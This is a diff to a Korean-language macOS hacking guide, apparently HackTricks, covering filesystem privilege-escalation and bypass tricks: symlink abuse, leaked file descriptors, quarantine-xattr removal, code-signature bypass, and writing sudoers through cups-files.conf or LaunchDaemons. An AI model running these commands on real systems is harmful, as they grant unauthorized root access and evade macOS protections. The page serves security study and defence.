@@ -2,48 +2,55 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## POSIX 권한 조합
+## POSIX permissions 조합
 
-**디렉토리**의 권한:
+**directory**의 permissions:
 
-- **읽기** - 디렉토리 항목을 **열거**할 수 있습니다.
-- **쓰기** - 디렉토리 내의 **파일**을 **삭제/작성**할 수 있으며, **빈 폴더**를 **삭제**할 수 있습니다.
-- 그러나 **쓰기 권한**이 없으면 **비어 있지 않은 폴더**를 **삭제/수정**할 수 없습니다.
-- **폴더의 이름을 수정**할 수 없습니다, 소유하지 않는 한.
-- **실행** - 디렉토리를 **탐색**할 수 있습니다 - 이 권한이 없으면 내부의 파일이나 하위 디렉토리에 접근할 수 없습니다.
+- **read** - directory 항목을 **enumerate**할 수 있음
+- **write** - directory 내 **files**를 **delete/write**할 수 있고, **empty folders**를 **delete**할 수 있음
+- 하지만 해당 폴더에 대한 write permissions가 없다면 **non-empty folders**를 **delete/modify**할 수 없음
+- 소유자가 아니라면 **folder**의 이름을 **modify**할 수 없음
+- **execute** - directory를 **traverse**할 수 있음 - 이 권한이 없으면 내부의 파일이나 하위 directory에 접근할 수 없음
 
-### 위험한 조합
+### Dangerous Combinations
 
-**루트가 소유한 파일/폴더를 덮어쓰는 방법**, 그러나:
+**root가 소유한 file/folder를 overwrite하는 방법**:
 
-- 경로의 한 부모 **디렉토리 소유자**가 사용자입니다.
-- 경로의 한 부모 **디렉토리 소유자**가 **쓰기 권한**이 있는 **사용자 그룹**입니다.
-- 사용자 **그룹**이 **파일**에 **쓰기** 권한을 가지고 있습니다.
+- 경로 내 하나의 parent **directory owner**가 해당 user임
+- 경로 내 하나의 parent **directory owner**가 **write access**를 가진 **users group**임
+- 한 **users group**이 **file**에 대해 **write** access를 가짐
 
-이전 조합 중 하나로 공격자는 **특권 임의 쓰기**를 얻기 위해 예상 경로에 **심볼릭/하드 링크**를 **주입**할 수 있습니다.
+이전 조합 중 하나라도 해당하면, attacker는 예상 경로에 **sym/hard link**를 **inject**하여 privileged arbitrary write를 얻을 수 있음.
 
-### 폴더 루트 R+X 특별 사례
+### Folder root R+X Special case
 
-**오직 루트만 R+X 접근 권한**을 가진 **디렉토리**에 파일이 있는 경우, 그 파일은 **다른 누구도 접근할 수 없습니다**. 따라서 **제한**으로 인해 사용자가 읽을 수 없는 **읽기 가능한 파일**을 이 폴더에서 **다른 폴더로 이동**할 수 있는 취약점이 악용되어 이러한 파일을 읽을 수 있습니다.
+**root만 R+X access**를 가진 **directory**에 files가 있다면, 해당 files는 다른 누구도 **access**할 수 없음. 따라서 user가 읽을 수 있지만 해당 **restriction** 때문에 읽을 수 없는 **file**을 이 folder에서 **different one**으로 **move**할 수 있게 하는 vulnerability는, 이 files를 읽는 데 악용될 수 있음.
 
-예시: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
+Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
 
-## 심볼릭 링크 / 하드 링크
+## Symbolic Link / Hard Link
 
-### 허용된 파일/폴더
+### Permissive file/folder
 
-특권 프로세스가 **하위 특권 사용자**에 의해 **제어**될 수 있는 **파일**에 데이터를 쓰고 있거나, 하위 특권 사용자에 의해 **이전에 생성된** 경우, 사용자는 심볼릭 또는 하드 링크를 통해 **다른 파일**을 가리킬 수 있으며, 특권 프로세스는 해당 파일에 쓸 것입니다.
+privileged process가 **lower privileged user**에 의해 **controlled**되거나, lower privileged user가 **previously created**할 수 있는 **file**에 data를 쓰는 경우, 해당 user는 Symbolic 또는 Hard link를 통해 이를 다른 **file**을 가리키도록 만들 수 있으며 privileged process는 그 file에 data를 쓰게 됨.
 
-공격자가 **임의 쓰기를 악용하여 권한을 상승**시킬 수 있는 다른 섹션을 확인하십시오.
+attacker가 **arbitrary write를 abuse하여 privileges를 escalate**할 수 있는 다른 sections를 확인할 것.
 
 ### Open `O_NOFOLLOW`
 
-`open` 함수에서 사용되는 플래그 `O_NOFOLLOW`는 마지막 경로 구성 요소에서 심볼릭 링크를 따르지 않지만, 나머지 경로는 따릅니다. 경로에서 심볼릭 링크를 따르지 않도록 하는 올바른 방법은 플래그 `O_NOFOLLOW_ANY`를 사용하는 것입니다.
+[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)에 따르면: *"`O_NOFOLLOW`가 mask에 사용되었고 `open()`에 전달된 target file이 symbolic link라면 `open()`은 fail함."* **final** component만 확인되며 — 모든 **intermediate** component는 여전히 resolve되고 follow됨. 따라서 `O_NOFOLLOW`로 write를 "protected"한 developer도 target path의 **parent directory** 중 하나에 symlink를 심어 공격할 수 있음.
+
+동일한 man page에는 이 gap을 실제로 차단하는 flags가 설명되어 있음:
+
+- **`O_NOFOLLOW_ANY`** — *"path passed to `open()`의 ... 어떤 component라도 symbolic link라면 `open()`은 fail함."*
+- **`O_RESOLVE_BENEATH`** — *"지정된 path resolution이 fd와 연결된 directory를 벗어나면 `openat()`은 fail함."*
+
+그렇지 않다면, 이미 validation을 완료한 directory FD를 기준으로 한 `openat()` 또는 `realpath()` + re-validation이 mid-path symlink swaps를 방지하는 나머지 방법임.
 
 ## .fileloc
 
-**`.fileloc`** 확장자를 가진 파일은 다른 애플리케이션이나 바이너리를 가리킬 수 있으므로, 열릴 때 애플리케이션/바이너리가 실행됩니다.\
-예시:
+**`.fileloc` extension**을 가진 Files는 다른 applications 또는 binaries를 가리킬 수 있으므로, 해당 파일을 open하면 그 application/binary가 실행됨.\
+Example:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -56,25 +63,37 @@
 </dict>
 </plist>
 ```
-## 파일 설명자
+## 파일 디스크립터
 
-### FD 누수 (no `O_CLOEXEC`)
+### Leak FD (`O_CLOEXEC` 없음)
 
-`open` 호출에 `O_CLOEXEC` 플래그가 없으면 파일 설명자가 자식 프로세스에 의해 상속됩니다. 따라서, 특권 프로세스가 특권 파일을 열고 공격자가 제어하는 프로세스를 실행하면, 공격자는 **특권 파일에 대한 FD를 상속받게 됩니다**.
+`open` 호출에 `O_CLOEXEC` 플래그가 없으면 파일 디스크립터가 child process에 상속됩니다. 따라서 privileged process가 privileged file을 열고 attacker가 제어하는 process를 실행하면, attacker는 **privileged file에 대한 FD를 상속**하게 됩니다.
 
-**높은 권한으로 파일이나 폴더를 열도록 프로세스를 만들 수 있다면**, **`crontab`**를 악용하여 **`EDITOR=exploit.py`**로 `/etc/sudoers.d`에 있는 파일을 열 수 있습니다. 그러면 `exploit.py`는 `/etc/sudoers` 내의 파일에 대한 FD를 얻고 이를 악용할 수 있습니다.
+대표적인 예는 **OS X 10.10의 `DYLD_PRINT_TO_FILE` LPE**입니다 ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):
 
-예를 들어: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), 코드: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging
+- `dyld`는 해당 변수가 `processDyldEnvironmentVariable()` 외부에서 파싱되었기 때문에 **restricted (suid root) binaries**에서도 `DYLD_PRINT_TO_FILE=/path`를 허용했습니다.
+- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`를 실행했으므로 **임의의 경로에 root 소유 파일을 생성**했습니다.
+- FD가 **절대 닫히지 않았고 close-on-exec 플래그도 없었기 때문에**, suid binary의 모든 child는 **root 소유 파일에 대한 writable FD**를 상속했습니다.
+- 예를 들어 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`를 실행한 다음 child에서 상속된 FD 번호를 읽으면 임의의 root 소유 파일 쓰기가 가능했습니다. 또한 `fcntl(fd, F_SETFL, 0)`을 사용하면 `O_APPEND`를 해제하여 append 대신 overwrite할 수도 있었습니다.
 
-## 격리 xattrs 트릭 피하기
+이와 동일한 형태는 privileged process가 사용자가 제어하는 대상을 `exec`하기 **전에** 파일을 열 때마다 나타납니다(helper tools, `$EDITOR`를 통해 호출되는 `crontab` 스타일 editor, env-var 경로에서 열리는 log/debug files 등). 다음을 사용하여 상속된 FD를 열거합니다:
+```bash
+# From inside the child process
+ls -l /dev/fd/
+# or
+lsof -p $$
+```
+`2`보다 크면서 직접 열 수 없는 파일을 가리키는 것은 무엇이든 arbitrary-write(또는 arbitrary-read) primitive입니다.
+
+## quarantine xattrs tricks 피하기
 
 ### 제거하기
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
-### uchg / uchange / uimmutable 플래그
+### uchg / uchange / uimmutable flag
 
-파일/폴더에 이 불변 속성이 설정되어 있으면 xattr를 추가할 수 없습니다.
+파일/폴더에 이 immutable attribute가 있으면 해당 파일/폴더에 xattr를 설정할 수 없습니다.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -84,17 +103,19 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-### defvfs mount
+### xattr를 지원하지 않는 파일 시스템
 
-A **devfs** mount **는 xattr를 지원하지 않습니다**, 자세한 내용은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)에서 확인하세요.
+macOS가 마운트할 수 있는 모든 파일 시스템이 **extended attributes**를 기본적으로 저장하는 것은 아닙니다. HFS+와 APFS는 지원하지만, **FAT32, exFAT 및 (대부분의) NFS 마운트는 지원하지 않습니다** — macOS는 `._<filename>`이라는 이름의 **AppleDouble** side file을 작성하여 이를 에뮬레이트합니다 ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).
+
+이는 quarantine에 중요합니다. xattr은 동일한 volume에서 실제로 작성되고 **다시 읽힐 수 있는 경우에만** 유지되기 때문입니다:
 ```bash
-mkdir /tmp/mnt
-mount_devfs -o noowners none "/tmp/mnt"
-chmod 777 /tmp/mnt
-mkdir /tmp/mnt/lol
-xattr -w com.apple.quarantine "" /tmp/mnt/lol
-xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
+# Check whether a mount point round-trips xattrs at all
+xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
+xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
+ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
 ```
+볼륨을 나중에 `._` companion을 무시하는 경로에서 읽거나(companion이 제거/삭제된 경우), 파일은 **quarantine flag 없이** 도착합니다. 그리고 quarantine되지 않은 `.app`이면 App Sandbox를 escape하기에 충분합니다. 자세한 내용은 [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)를 참고하세요.
+
 ### writeextattr ACL
 
 이 ACL은 파일에 `xattrs`를 추가하는 것을 방지합니다.
@@ -120,13 +141,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** 파일 형식은 ACE를 포함하여 파일을 복사합니다.
+**AppleDouble** 파일 형식은 ACE를 포함한 파일을 복사합니다.
 
-[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 **`com.apple.acl.text`**라는 xattr에 저장된 ACL 텍스트 표현이 압축 해제된 파일의 ACL로 설정될 것임을 확인할 수 있습니다. 따라서, ACL이 다른 xattrs가 작성되는 것을 방지하는 애플리케이션을 **AppleDouble** 파일 형식의 zip 파일로 압축했다면... 격리 xattr는 애플리케이션에 설정되지 않았습니다:
+[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 xattr 내부에 저장된 **`com.apple.acl.text`** ACL 텍스트 표현이 압축 해제된 파일에 ACL로 설정된다는 것을 확인할 수 있습니다. 따라서 다른 xattr이 파일에 기록되지 않도록 하는 ACL과 함께 애플리케이션을 **AppleDouble** 파일 형식의 zip 파일로 압축하면, 해당 애플리케이션에는 quarantine xattr이 설정되지 않습니다.
 
-자세한 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.
+자세한 내용은 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.
 
-이를 복제하기 위해 먼저 올바른 acl 문자열을 가져와야 합니다:
+이를 재현하려면 먼저 올바른 acl 문자열을 가져와야 합니다:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -144,24 +165,24 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-(Note that even if this works the sandbox write the quarantine xattr before)
+(이 방법이 작동하더라도 sandbox가 먼저 quarantine xattr을 기록한다는 점에 유의하세요)
 
-Not really needed but I leave it there just in case:
+실제로 필요하지는 않지만, 만일을 위해 남겨 둡니다:
 
 
 {{#ref}}
 macos-xattr-acls-extra-stuff.md
 {{#endref}}
 
-## 서명 검사 우회
+## Bypass signature checks
 
-### 플랫폼 바이너리 검사 우회
+### Bypass platform binaries checks
 
-일부 보안 검사는 바이너리가 **플랫폼 바이너리**인지 확인하여 XPC 서비스에 연결할 수 있도록 허용합니다. 그러나 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/에서 노출된 것처럼, /bin/ls와 같은 플랫폼 바이너리를 가져오고 `DYLD_INSERT_LIBRARIES` 환경 변수를 사용하여 dyld를 통해 익스플로잇을 주입함으로써 이 검사를 우회할 수 있습니다.
+일부 security check는 바이너리가 **platform binary**인지 확인합니다. 예를 들어 XPC service에 연결을 허용하기 위해서입니다. 그러나 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/의 bypass 사례에서 설명했듯이, platform binary(예: /bin/ls)를 가져온 다음 환경 변수 `DYLD_INSERT_LIBRARIES`를 사용해 dyld를 통해 exploit을 주입하면 이 check를 bypass할 수 있습니다.
 
-### 플래그 `CS_REQUIRE_LV` 및 `CS_FORCED_LV` 우회
+### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`
 
-실행 중인 바이너리가 자신의 플래그를 수정하여 다음과 같은 코드로 검사를 우회할 수 있습니다:
+실행 중인 바이너리가 다음과 같은 code를 사용해 자신의 flags를 수정하여 check를 bypass하는 것이 가능합니다:
 ```c
 // Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
 int pid = getpid();
@@ -174,11 +195,11 @@ csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS
 status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
 NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
 ```
-## 코드 서명 우회
+## Bypass Code Signatures
 
-번들에는 **`_CodeSignature/CodeResources`** 파일이 포함되어 있으며, 이 파일에는 **번들** 내의 모든 **파일**의 **해시**가 포함되어 있습니다. CodeResources의 해시는 **실행 파일**에도 **내장**되어 있으므로, 그것을 건드릴 수 없습니다.
+Bundles에는 **`_CodeSignature/CodeResources`** 파일이 있으며, 이 파일에는 **bundle** 내 모든 **file**의 **hash**가 포함되어 있습니다. 또한 CodeResources의 hash도 **executable**에 **embedded**되어 있으므로, 이 역시 변경할 수 없습니다.
 
-그러나 서명이 확인되지 않는 일부 파일이 있으며, 이 파일들은 plist에서 omit 키를 가지고 있습니다.
+하지만 signature가 검사되지 않는 일부 파일이 있으며, 이러한 파일은 plist에 `omit` key가 지정되어 있습니다. 예:
 ```xml
 <dict>
 ...
@@ -222,13 +243,13 @@ NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, statu
 ...
 </dict>
 ```
-CLI에서 리소스의 서명을 계산하는 것은 다음과 같이 가능합니다:
+CLI에서 리소스의 서명을 계산할 수 있습니다:
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-## Mount dmgs
+## dmgs 마운트
 
-사용자는 기존 폴더 위에 생성된 사용자 정의 dmg를 마운트할 수 있습니다. 이렇게 하면 사용자 정의 콘텐츠로 사용자 정의 dmg 패키지를 생성할 수 있습니다:
+사용자는 기존 폴더 위에도 직접 생성한 custom dmg를 마운트할 수 있습니다. 다음과 같이 custom 콘텐츠가 포함된 custom dmg 패키지를 생성할 수 있습니다:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -249,20 +270,20 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
-보통 macOS는 `/usr/libexec/diskarbitrationd`에서 제공하는 `com.apple.DiskArbitrarion.diskarbitrariond` Mach 서비스와 통신하여 디스크를 마운트합니다. LaunchDaemons plist 파일에 `-d` 매개변수를 추가하고 재시작하면 `/var/log/diskarbitrationd.log`에 로그를 저장합니다.\
-그러나 `hdik` 및 `hdiutil`과 같은 도구를 사용하여 `com.apple.driver.DiskImages` kext와 직접 통신하는 것이 가능합니다.
+일반적으로 macOS는 `/usr/libexec/diskarbitrationd`에서 제공하는 `com.apple.DiskArbitrarion.diskarbitrariond` Mach service와 통신하여 disk를 mount합니다. LaunchDaemons plist file에 `-d` parameter를 추가하고 재시작하면 `/var/log/diskarbitrationd.log`에 logs가 저장됩니다.\
+하지만 `hdik` 및 `hdiutil`과 같은 tools를 사용하여 `com.apple.driver.DiskImages` kext와 직접 통신할 수도 있습니다.
 
-## 임의 쓰기
+## Arbitrary Writes
 
-### 주기적인 sh 스크립트
+### Periodic sh scripts
 
-스크립트가 **셸 스크립트**로 해석될 수 있다면, 매일 트리거되는 **`/etc/periodic/daily/999.local`** 셸 스크립트를 덮어쓸 수 있습니다.
+script가 **shell script**로 해석될 수 있다면 매일 trigger되는 **`/etc/periodic/daily/999.local`** shell script를 overwrite할 수 있습니다.
 
-다음과 같이 이 스크립트의 실행을 **가짜로** 만들 수 있습니다: **`sudo periodic daily`**
+다음을 사용하여 이 script의 실행을 **fake**할 수 있습니다: **`sudo periodic daily`**
 
-### 데몬
+### Daemons
 
-임의의 스크립트를 실행하는 plist와 함께 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**와 같은 임의의 **LaunchDaemon**을 작성합니다:
+**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**와 같은 임의의 **LaunchDaemon**을 작성하고, 다음과 같이 임의의 script를 실행하는 plist를 지정합니다:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -293,7 +314,7 @@ You can also write files in **`/etc/paths.d`** to load new folders into the `PAT
 
 ### cups-files.conf
 
-이 기술은 [이 글](https://www.kandji.io/blog/macos-audit-story-part1)에서 사용되었습니다.
+This technique was used in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).
 
 Create the file `/etc/cups/cups-files.conf` with the following content:
 ```
@@ -301,37 +322,44 @@ ErrorLog /etc/sudoers.d/lpe
 LogFilePerm 777
 <some junk>
 ```
-이것은 `/etc/sudoers.d/lpe` 파일을 777 권한으로 생성합니다. 끝에 있는 추가 쓰레기는 오류 로그 생성을 트리거하기 위한 것입니다.
+그러면 권한이 777인 `/etc/sudoers.d/lpe` 파일이 생성됩니다. 끝부분의 불필요한 내용은 오류 로그 생성을 트리거하기 위한 것입니다.
 
-그런 다음, `/etc/sudoers.d/lpe`에 `%staff ALL=(ALL) NOPASSWD:ALL`과 같은 권한 상승에 필요한 구성을 작성합니다.
+그런 다음 `/etc/sudoers.d/lpe`에 `%staff ALL=(ALL) NOPASSWD:ALL`과 같이 privileges를 escalate하는 데 필요한 config를 작성합니다.
 
-그런 다음, `/etc/cups/cups-files.conf` 파일을 다시 수정하여 `LogFilePerm 700`을 지정하여 새로운 sudoers 파일이 `cupsctl`을 호출할 때 유효하게 만듭니다.
+그런 다음 `/etc/cups/cups-files.conf`를 다시 수정하여 `LogFilePerm 700`을 지정하면, `cupsctl`을 호출할 때 새 sudoers 파일이 유효해집니다.
 
-### 샌드박스 탈출
+### Sandbox Escape
 
-FS 임의 쓰기를 통해 macOS 샌드박스를 탈출하는 것이 가능합니다. 몇 가지 예시는 [macOS Auto Start](../../../../macos-auto-start-locations.md) 페이지를 확인하세요. 그러나 일반적인 방법은 `~/Library/Preferences/com.apple.Terminal.plist`에 터미널 환경설정 파일을 작성하여 시작 시 명령을 실행하고 `open`을 사용하여 호출하는 것입니다.
+FS arbitrary write를 사용하여 macOS sandbox에서 탈출할 수 있습니다. 몇 가지 예시는 [macOS Auto Start](../../../../macos-auto-start-locations.md) 페이지를 확인하세요. 일반적인 방법 중 하나는 시작 시 command를 실행하는 Terminal preferences 파일을 `~/Library/Preferences/com.apple.Terminal.plist`에 작성한 다음 `open`을 사용하여 호출하는 것입니다.
 
-## 다른 사용자로서 쓰기 가능한 파일 생성
+## 다른 사용자로 writable files 생성
 
-이것은 내가 쓸 수 있는 루트 소유의 파일을 생성합니다 ([**여기서 코드**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). 이것은 권한 상승으로도 작동할 수 있습니다:
+매우 일반적인 privesc primitive는 **권한이 있는 process가 사용자가 제어하는 directory에 file을 생성하도록 만들고**, 해당 file에 대한 **write access**를 계속 유지하는 것입니다. 이를 위해서는 두 가지 요소가 필요합니다.
+
+1. 사용자가 소유한 directory(또는 **inheritable ACL**을 설정할 수 있는 directory). 이렇게 하면 내부에 생성되는 모든 항목이 사용자의 permissions를 상속합니다.
+2. **어디에** file을 생성할지 지정할 수 있는 privileged/`suid` process. 일반적으로 debug/logging environment variable, config file 또는 helper의 XPC API를 통해 지정합니다.
+
+생성된 file이 다른 사용자의 소유임에도 사용자가 쓸 수 있게 되는 이유는 **inheritable ACL** 때문입니다. `file_inherit` / `directory_inherit` inheritance flags는 [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html)에 문서화되어 있습니다.
 ```bash
-DIRNAME=/usr/local/etc/periodic/daily
-
+DIRNAME=/tmp/inherit_test
 mkdir -p "$DIRNAME"
-chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"
 
-MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername
+# file_inherit + directory_inherit => everything created inside is writable by me
+chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"
 
-FILENAME=$(ls "$DIRNAME")
-echo $FILENAME
+ls -lde "$DIRNAME"   # confirm the ACE is present
 ```
-## POSIX 공유 메모리
+이제 권한이 있는 프로세스가 `$DIRNAME` 내부에 생성하는 모든 파일은 **사용자가 쓸 수 있습니다**. 해당 디렉터리가 나중에 **root로 실행되는 위치**(`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, LaunchDaemon 디렉터리 등)이기도 하다면, 이는 직접적인 root escalation입니다. 파일을 확보한 후 무엇을 작성해야 하는지는 위의 [Sudoers File](#sudoers-file) 및 [cups-files.conf](#cups-filesconf) 섹션을 참조하세요.
 
-**POSIX 공유 메모리**는 POSIX 호환 운영 체제에서 프로세스가 공통 메모리 영역에 접근할 수 있도록 하여 다른 프로세스 간 통신 방법에 비해 더 빠른 통신을 가능하게 합니다. 이는 `shm_open()`을 사용하여 공유 메모리 객체를 생성하거나 열고, `ftruncate()`로 크기를 설정하며, `mmap()`을 사용하여 프로세스의 주소 공간에 매핑하는 과정을 포함합니다. 프로세스는 이 메모리 영역에서 직접 읽고 쓸 수 있습니다. 동시 접근을 관리하고 데이터 손상을 방지하기 위해 뮤텍스나 세마포어와 같은 동기화 메커니즘이 자주 사용됩니다. 마지막으로, 프로세스는 `munmap()`과 `close()`를 사용하여 공유 메모리를 언매핑하고 닫으며, 선택적으로 `shm_unlink()`로 메모리 객체를 제거합니다. 이 시스템은 여러 프로세스가 공유 데이터에 빠르게 접근해야 하는 환경에서 효율적이고 빠른 IPC를 위해 특히 효과적입니다.
+"env variable이 root 프로세스로 하여금 파일을 생성하게 만들고, FD가 사용자에게 leak되는" 전체 실행 예시는 위의 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)를 참조하세요.
+
+## POSIX Shared Memory
+
+**POSIX shared memory**를 사용하면 POSIX 호환 운영 체제의 프로세스들이 공통 메모리 영역에 액세스할 수 있으므로, 다른 inter-process communication 방식보다 빠른 통신이 가능합니다. `shm_open()`으로 shared memory object를 생성하거나 열고, `ftruncate()`로 크기를 설정한 다음, `mmap()`을 사용하여 프로세스의 주소 공간에 매핑합니다. 그러면 프로세스가 이 메모리 영역을 직접 읽고 쓸 수 있습니다. 동시 액세스를 관리하고 데이터 손상을 방지하기 위해 mutex 또는 semaphore와 같은 synchronization mechanism을 사용하는 경우가 많습니다. 마지막으로 프로세스는 `munmap()` 및 `close()`를 사용하여 shared memory의 매핑을 해제하고 닫으며, 필요에 따라 `shm_unlink()`로 memory object를 제거할 수 있습니다. 이 시스템은 여러 프로세스가 shared data에 빠르게 액세스해야 하는 환경에서 효율적이고 빠른 IPC를 구현하는 데 특히 효과적입니다.
 
 <details>
 
-<summary>생산자 코드 예제</summary>
+<summary>Producer Code Example</summary>
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -379,7 +407,7 @@ return 0;
 
 <details>
 
-<summary>소비자 코드 예제</summary>
+<summary>Consumer 코드 예제</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -421,18 +449,23 @@ return 0;
 ```
 </details>
 
-## macOS 보호된 설명자
+## macOS Guarded Descriptors
 
-**macOS 보호된 설명자**는 사용자 애플리케이션에서 **파일 설명자 작업**의 안전성과 신뢰성을 향상시키기 위해 macOS에 도입된 보안 기능입니다. 이러한 보호된 설명자는 파일 설명자와 특정 제한 또는 "가드"를 연결하는 방법을 제공하며, 이는 커널에 의해 시행됩니다.
+**macOSCguarded descriptors**는 사용자 애플리케이션의 **file descriptor operations** 안전성과 신뢰성을 향상하기 위해 macOS에 도입된 보안 기능입니다. 이러한 guarded descriptors는 file descriptor에 특정 제한 또는 "guards"를 연결하는 방법을 제공하며, 이는 kernel에 의해 적용됩니다.
 
-이 기능은 **무단 파일 접근** 또는 **경쟁 조건**과 같은 특정 보안 취약점을 방지하는 데 특히 유용합니다. 이러한 취약점은 예를 들어, 스레드가 파일 설명서에 접근할 때 **다른 취약한 스레드가 그에 대한 접근을 허용하는 경우** 또는 파일 설명자가 **취약한 자식 프로세스에 의해 상속되는 경우** 발생합니다. 이 기능과 관련된 일부 함수는 다음과 같습니다:
+이 기능은 **unauthorized file access** 또는 **race conditions**와 같은 특정 유형의 보안 취약점을 방지하는 데 특히 유용합니다. 이러한 취약점은 예를 들어 한 thread가 file description에 접근하여 **another vulnerable thread access over it**을 제공하거나, file descriptor가 취약한 child process에 **inherited**될 때 발생합니다. 이 기능과 관련된 일부 함수는 다음과 같습니다.
 
-- `guarded_open_np`: 가드와 함께 FD를 엽니다
-- `guarded_close_np`: 닫습니다
-- `change_fdguard_np`: 설명자의 가드 플래그를 변경합니다 (가드 보호를 제거하는 것도 포함)
+- `guarded_open_np`: guard를 사용하여 FD 열기
+- `guarded_close_np`: FD 닫기
+- `change_fdguard_np`: descriptor의 guard flags 변경 (guard protection 제거도 가능)
 
 ## References
 
 - [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
+- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec가 설정되지 않은 leaked FD)
+- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
+- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
+- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
+- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
